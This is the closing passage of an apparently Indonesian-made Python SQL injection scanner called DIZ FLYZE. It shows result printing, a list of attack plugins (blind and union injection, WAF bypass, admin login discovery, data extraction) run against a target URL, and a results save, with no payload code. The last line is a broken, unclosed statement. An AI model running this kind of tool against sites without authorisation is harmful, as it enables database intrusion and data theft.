    for plugin, data in results.items():
        console.print(f"[bold yellow]{plugin}:[/bold yellow]\n")
        if isinstance(data, list):
            if not data:
                console.print("  [bold red]━>> [ TIDAK ADA RESPON ][/bold red]\n")
                console.print(separator)
            else:
                for entry in data:
                    if isinstance(entry, dict):
                        for k, v in entry.items():
                            console.print(f"  [green]{k}[/green]: {v}\n")
                    elif isinstance(entry, str):
                        console.print(f"  {entry}\n")
                    else:
                        console.print(f"  {entry}\n")
                    console.print(separator)
        elif isinstance(data, dict):
            if not data:
                console.print("  [bold red]━>> [ TIDAK ADA RESPON ][/bold red]\n")
                console.print(separator)
            else:
                for key, value in data.items():
                    console.print(f"  [green]{key}[/green]: {value}\n")
                console.print(separator)
        elif isinstance(data, str):
            console.print(f"  {data}\n")
            console.print(separator)
        else:
            console.print(f"  {data}\n")
            console.print(separator)
    console.print("[bold green]\n━━> [ SUKSES SCAN BOSKU ] <━━\n[/bold green]")
async def async_main(args):
    scanner = DizFlyzeScanner(args.url, method=args.method, proxy=args.proxy, timeout=10)
    plugins_to_register = [
        ErrorBasedPlugin(),
        BlindBooleanPlugin(),
        TimeBasedPlugin(),
        UnionBasedPlugin(),
        StackedQueryPlugin(),
        AdvancedUnionPlugin(),
        SecondOrderPlugin(),
        EnhancedOOBInjectionPlugin(),
        DBFingerprintPlugin(),
        AdvancedPayloadPlugin(),
        DBMSFingerprintPlugin(),
        DataExtractionPlugin(),
        ParameterTamperingPlugin(),
        HybridInjectionPlugin(),
        DynamicPluginLoader(),
        AdminLoginDiscoveryPlugin(),
        FullDatabaseInfoPlugin(),
        WAFBypassPlugin(),
        AdvancedEndpointCrawlerPlugin(),
        NoSQLInjectionPlugin(),
        ParameterFuzzerPlugin(),
        AdvancedObfuscationPlugin(),
        ComprehensiveReportPlugin(),
        MultiDBMSFingerprintPlugin(),
        DatabaseStructureEnumerationPlugin(),
        HeaderInjectionPlugin(),
        JSONInjectionPlugin(),
        ParameterPollutionPlugin(),
        AdaptivePayloadOptimizationPlugin(),
        AdaptiveMLPayloadPlugin(),
        ThreatIntelligencePlugin(),
        UserManagementPlugin(),
        MessageQueueIntegrationPlugin(),
        MicroservicesOrchestrationPlugin(),
        APIServerPlugin(),
        AdditionalInjectionTechniquesPlugin(),
        DistributedScanningPlugin(),
        HeadlessBrowserPlugin(),
        AutomationOrchestrationPlugin(),
        InternalSecurityHardeningPlugin()
    ]
    for plugin in plugins_to_register:
        scanner.register_plugin(plugin)
    await scanner.init_session()
    results = await scanner.run_plugins()
    await scanner.close_session()
    return results
def main():
    draw_logo()
    display_note()
    console.print("\n[bold cyan][ ━━● DIZ FLYZE SCAN STARTING ●━━ ][/bold cyan]\n", justify="center")
    time.sleep(5)
    parser = argparse.ArgumentParser(description="DIZ FLYZE DEVELOPER SCRIPT")
    parser.add_argument("url", help="TARGET LINK DENGAN QUERY PARAMETER")
    parser.add_argument("--method", help="REQUEST METHOD: GET atau POST", default="GET")
    parser.add_argument("--proxy", help="PROXY URL (mis: http://127.0.0.1:8080)", default=None)
    args = parser.parse_args()
    results = asyncio.run(async_main(args))
    display_results(results)
    console.print("\n[bold green]━━> [ SCAN SELESAI ] <━━[/bold green]\n")
    console.print("\n[bold yellow]DIZ FLYZE SCANNER: FRAMEWORK MODERN, MODULAR, DAN SUPER Canggih.[/bold yellow]\n")
    choice = input("SIMPAN SEMUA HASIL? (y/n): ")
    if choice.strip().lower() == "y":
        try:
            save_path = "/sdcard/Download/fullhasil_scan.json"
            with open(save_path, "w") as f:
                f.write(json.dumps(results, indent=4))
            console.print(f"[bold green]Hasil telah disimpan di {save_path}[/bold green]")
        except Exception as e:
            console.print(f"[bold red]Gagal menyimpan hasil: {str(e)}[/bold red]")
    else:
        console.print("[bold yellow]Tidak menyimpan hasil. Program selesai.[/bold yellow]")
if __name__ == "__main__":
    main()
console.print("━━" * 20 + "\n"
